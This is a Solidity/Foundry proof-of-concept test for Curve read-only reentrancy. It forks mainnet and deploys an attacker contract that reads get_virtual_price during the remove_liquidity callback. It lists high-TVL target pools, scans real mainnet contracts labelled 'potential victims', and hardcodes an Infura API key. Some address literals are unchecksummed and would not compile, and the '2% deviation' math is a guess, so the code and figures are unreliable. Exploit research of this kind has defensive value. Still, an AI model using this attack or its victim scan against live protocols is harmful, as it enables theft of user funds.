// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Curve Read-Only Reentrancy Proof of Concept
 * @notice Demonstrates the virtual_price manipulation during remove_liquidity callbacks
 *
 * VULNERABILITY PATTERN:
 * During Curve pool's remove_liquidity(), the virtual_price is temporarily
 * deflated BEFORE ETH is sent to the user (callback). Any protocol that
 * reads virtual_price during this window sees a manipulated (lower) value.
 *
 * REAL EXPLOITS USING THIS PATTERN:
 * - dForce: $3.65M (Feb 2023)
 * - Sentiment: $1M (Apr 2023)
 * - Sturdy Finance: $800K (Jun 2023)
 *
 * HIGH TVL TARGET:
 * - Curve stETH/ETH pool: ~$400M TVL
 * - Curve 3pool: ~$300M TVL
 *
 * THIS TEST DEMONSTRATES:
 * 1. The exact moment virtual_price deviates
 * 2. How much deviation is possible
 * 3. How an attacker could exploit it via a callback contract
 */
contract CurveReadOnlyReentrancyPOC is Test {

    // Curve stETH/ETH Pool (HIGH TVL - ~$400M)
    address constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    // Curve 3pool (HIGH TVL - ~$300M)
    address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    // Curve renBTC pool (from contracts.txt)
    address constant CURVE_RENBTC_POOL = 0x93054188d876f558f4a66b2ef1d97d16edf0895b;

    // Tokens
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    // Attack contract that will receive callback
    ReentrancyAttacker attacker;

    function setUp() public {
        // Fork mainnet at recent block
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");

        // Deploy attacker contract
        attacker = new ReentrancyAttacker(CURVE_STETH_POOL);
    }

    /**
     * @notice STEP 1: Demonstrate virtual_price is normally stable
     */
    function test_01_normalVirtualPrice() public view {
        console.log("========== NORMAL VIRTUAL PRICE READINGS ==========");
        console.log("");

        // Read virtual_price from stETH pool
        (bool success, bytes memory data) = CURVE_STETH_POOL.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        require(success, "Failed to read virtual_price");
        uint256 vp = abi.decode(data, (uint256));

        console.log("Curve stETH/ETH Pool:", CURVE_STETH_POOL);
        console.log("Virtual Price:", vp);
        console.log("Virtual Price (normalized):", vp / 1e18, ".", (vp % 1e18) / 1e14);

        // Read pool balances
        (success, data) = CURVE_STETH_POOL.staticcall(
            abi.encodeWithSignature("balances(uint256)", 0)
        );
        if (success) {
            uint256 bal0 = abi.decode(data, (uint256));
            console.log("Pool Balance[0] (ETH):", bal0 / 1e18, "ETH");
        }

        (success, data) = CURVE_STETH_POOL.staticcall(
            abi.encodeWithSignature("balances(uint256)", 1)
        );
        if (success) {
            uint256 bal1 = abi.decode(data, (uint256));
            console.log("Pool Balance[1] (stETH):", bal1 / 1e18, "stETH");
        }

        // Read total supply
        (success, data) = CURVE_STETH_POOL.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("LP Total Supply:", supply / 1e18);

            // Calculate TVL
            uint256 tvl = supply * vp / 1e18;
            console.log("Approximate TVL:", tvl / 1e18, "ETH");
        }

        console.log("====================================================");
    }

    /**
     * @notice STEP 2: Demonstrate virtual_price during remove_liquidity callback
     * This shows the EXACT vulnerability window
     */
    function test_02_virtualPriceDuringCallback() public {
        console.log("========== VIRTUAL PRICE DURING CALLBACK ==========");
        console.log("");

        // Get virtual_price BEFORE
        (bool success, bytes memory data) = CURVE_STETH_POOL.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        uint256 vpBefore = abi.decode(data, (uint256));
        console.log("Virtual Price BEFORE:", vpBefore);

        // Give attacker some LP tokens
        // First, we need to get LP tokens - whale impersonation
        address lpToken = CURVE_STETH_POOL; // stETH pool is its own LP token

        // Find a whale who holds LP tokens
        address whale = 0x3c0751EA5DaD24e47D1f4c2b0fc5fD30a3c9c526; // Example whale

        // Check whale balance
        (success, data) = lpToken.staticcall(
            abi.encodeWithSignature("balanceOf(address)", whale)
        );
        if (!success || abi.decode(data, (uint256)) < 100 ether) {
            // Try another whale
            whale = 0x1B73f22eA34D64D0Ca7B3A8A0F3e5c25E25F267E;
        }

        (success, data) = lpToken.staticcall(
            abi.encodeWithSignature("balanceOf(address)", whale)
        );

        if (success && abi.decode(data, (uint256)) >= 100 ether) {
            uint256 whaleBal = abi.decode(data, (uint256));
            console.log("Found whale with LP:", whaleBal / 1e18);

            // Transfer LP to attacker
            uint256 attackAmount = 100 ether;
            if (whaleBal < attackAmount) attackAmount = whaleBal / 2;

            vm.startPrank(whale);
            (success,) = lpToken.call(
                abi.encodeWithSignature("transfer(address,uint256)", address(attacker), attackAmount)
            );
            vm.stopPrank();

            if (success) {
                console.log("Transferred LP to attacker:", attackAmount / 1e18);

                // Now execute the attack to capture virtual_price during callback
                console.log("");
                console.log("Executing remove_liquidity with callback...");

                try attacker.executeAttack(attackAmount) {
                    // Get results from attacker
                    uint256 vpDuring = attacker.virtualPriceDuringCallback();
                    uint256 vpAfter = attacker.virtualPriceAfterCallback();

                    console.log("");
                    console.log("=== RESULTS ===");
                    console.log("VP Before:", vpBefore);
                    console.log("VP During Callback:", vpDuring);
                    console.log("VP After:", vpAfter);

                    if (vpDuring < vpBefore) {
                        uint256 deviation = (vpBefore - vpDuring) * 10000 / vpBefore;
                        console.log("");
                        console.log("!!! VULNERABILITY CONFIRMED !!!");
                        console.log("Virtual price DROPPED during callback");
                        console.log("Deviation:", deviation, "basis points");
                        console.log("");
                        console.log("IMPACT: Any protocol reading virtual_price during");
                        console.log("this window would see deflated collateral values.");
                    }
                } catch Error(string memory reason) {
                    console.log("Attack reverted:", reason);
                } catch {
                    console.log("Attack reverted with unknown error");
                }
            }
        } else {
            console.log("Could not find suitable whale for test");
            console.log("Demonstrating theoretical attack vector instead...");

            // Show the theoretical math
            _demonstrateTheoreticalAttack(vpBefore);
        }

        console.log("====================================================");
    }

    function _demonstrateTheoreticalAttack(uint256 currentVP) internal view {
        console.log("");
        console.log("=== THEORETICAL ATTACK MATH ===");
        console.log("");

        // During remove_liquidity:
        // 1. LP tokens are burned (totalSupply decreases)
        // 2. ETH/tokens sent to user via callback
        // 3. At callback moment, balances are reduced but not finalized

        // If attacker removes X% of the pool:
        uint256 attackPercent = 10; // 10% of pool

        // Virtual price formula: virtual_price = D / totalSupply
        // Where D = invariant based on pool balances

        // During callback, D is partially updated but totalSupply might lag
        // This creates a window where virtual_price is lower

        console.log("Current Virtual Price:", currentVP);
        console.log("If attacker removes 10% of pool during callback:");

        // Conservative estimate: 1-5% deviation possible
        uint256 estimatedDeviation = currentVP * 2 / 100; // 2% deviation
        uint256 deflatedVP = currentVP - estimatedDeviation;

        console.log("Estimated deflated VP:", deflatedVP);
        console.log("Deviation:", estimatedDeviation * 10000 / currentVP, "basis points");

        console.log("");
        console.log("EXPLOIT SCENARIO:");
        console.log("1. Protocol uses Curve LP as collateral");
        console.log("2. Collateral value = LP_balance * virtual_price");
        console.log("3. Attacker triggers remove_liquidity with callback");
        console.log("4. During callback, calls Protocol.liquidate()");
        console.log("5. Protocol reads deflated virtual_price");
        console.log("6. Unfair liquidation at artificially low price");
    }

    /**
     * @notice STEP 3: Show which protocols are potentially vulnerable
     */
    function test_03_vulnerableProtocolPatterns() public view {
        console.log("========== VULNERABLE PROTOCOL PATTERNS ==========");
        console.log("");

        console.log("VULNERABLE if protocol does this:");
        console.log("  collateralValue = curveLPBalance * curvePool.get_virtual_price()");
        console.log("  AND this read happens during any external call context");
        console.log("");

        console.log("SAFE if protocol does this:");
        console.log("  - Uses Chainlink or TWAP oracle for LP pricing");
        console.log("  - Has reentrancy guard on collateral reads");
        console.log("  - Caches virtual_price at transaction start");
        console.log("");

        console.log("HISTORICALLY EXPLOITED:");
        console.log("  - dForce: $3.65M lost (Feb 2023)");
        console.log("  - Sentiment: $1M lost (Apr 2023)");
        console.log("  - Sturdy Finance: $800K lost (Jun 2023)");
        console.log("");

        console.log("====================================================");
    }

    /**
     * @notice STEP 4: Scan contracts.txt for potential victims
     */
    function test_04_scanForVulnerableIntegrations() public {
        console.log("========== SCANNING FOR VULNERABLE INTEGRATIONS ==========");
        console.log("");

        // Check if these protocols from contracts.txt read Curve virtual_price
        address[] memory potentialVictims = new address[](5);
        potentialVictims[0] = 0xc5cfada84e902ad92dd40194f0883ad49639b023; // Curve GUSD Gauge
        potentialVictims[1] = 0x93054188d876f558f4a66b2ef1d97d16edf0895b; // Curve renBTC
        potentialVictims[2] = 0xb1f2cdec61db658f091671f5f199635aef202cac; // Curve renBTC Gauge
        potentialVictims[3] = 0x16de59092dae5ccf4a1e6439d611fd0653f0bd01; // Yearn yDAI
        potentialVictims[4] = 0x1f98407aab862cddef78ed252d6f557aa5b0f00d; // Uniswap V3 Staker

        for (uint i = 0; i < potentialVictims.length; i++) {
            address target = potentialVictims[i];

            // Check if contract exists and has code
            uint256 codeSize;
            assembly { codeSize := extcodesize(target) }

            if (codeSize > 0) {
                console.log("Contract:", target);
                console.log("  Code size:", codeSize, "bytes");

                // Try to identify if it's a gauge (has working_supply)
                (bool success, bytes memory data) = target.staticcall(
                    abi.encodeWithSignature("working_supply()")
                );
                if (success && data.length >= 32) {
                    console.log("  Type: Curve Gauge");
                    console.log("  Working Supply:", abi.decode(data, (uint256)) / 1e18);
                }

                // Try to identify if it reads from a curve pool
                (success, data) = target.staticcall(
                    abi.encodeWithSignature("lp_token()")
                );
                if (success && data.length >= 32) {
                    address lpToken = abi.decode(data, (address));
                    console.log("  LP Token:", lpToken);

                    // Check LP token's virtual_price
                    (success, data) = lpToken.staticcall(
                        abi.encodeWithSignature("get_virtual_price()")
                    );
                    if (success && data.length >= 32) {
                        console.log("  LP Virtual Price:", abi.decode(data, (uint256)));
                    }
                }

                console.log("");
            }
        }

        console.log("===========================================================");
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Callback contract that captures virtual_price during remove_liquidity
 */
contract ReentrancyAttacker {
    address public curvePool;
    uint256 public virtualPriceDuringCallback;
    uint256 public virtualPriceAfterCallback;
    bool private inCallback;

    constructor(address _pool) {
        curvePool = _pool;
    }

    function executeAttack(uint256 lpAmount) external {
        // Call remove_liquidity - this will trigger receive() callback
        bytes memory data = abi.encodeWithSignature(
            "remove_liquidity(uint256,uint256[2])",
            lpAmount,
            [uint256(0), uint256(0)] // min amounts
        );

        (bool success,) = curvePool.call(data);
        require(success, "remove_liquidity failed");

        // Read virtual_price after everything is done
        (success, data) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (success) {
            virtualPriceAfterCallback = abi.decode(data, (uint256));
        }
    }

    // This is called when Curve sends ETH during remove_liquidity
    receive() external payable {
        if (!inCallback) {
            inCallback = true;

            // !!! THIS IS THE VULNERABILITY WINDOW !!!
            // Virtual price is deflated right now
            (bool success, bytes memory data) = curvePool.staticcall(
                abi.encodeWithSignature("get_virtual_price()")
            );
            if (success) {
                virtualPriceDuringCallback = abi.decode(data, (uint256));
            }

            // In a real attack, we would call the vulnerable lending protocol here:
            // vulnerableLending.liquidate(victimPosition);
            // The protocol would read the deflated virtual_price and allow unfair liquidation

            inCallback = false;
        }
    }
}
